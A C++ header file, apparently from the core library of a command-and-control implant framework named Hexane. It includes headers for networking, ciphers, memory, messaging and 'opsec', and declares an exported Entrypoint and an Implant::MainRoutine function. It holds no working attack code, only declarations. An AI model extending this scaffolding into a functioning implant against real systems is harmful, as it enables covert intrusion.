#ifndef HEXANE_CORELIB_BASE_HPP
#define HEXANE_CORELIB_BASE_HPP
#include <monolith.hpp>
#include <core/include/corelib.hpp>
#include <core/include/cruntime.hpp>
#include <core/include/network.hpp>
#include <core/include/memory.hpp>
#include <core/include/message.hpp>
#include <core/include/cipher.hpp>
#include <core/include/opsec.hpp>
#include <core/include/names.hpp>
#include <core/include/utils.hpp>
#include <core/include/config.hpp>

EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);

namespace Implant {
    FUNCTION VOID MainRoutine();
}

#endif //HEXANE_CORELIB_BASE_HPP
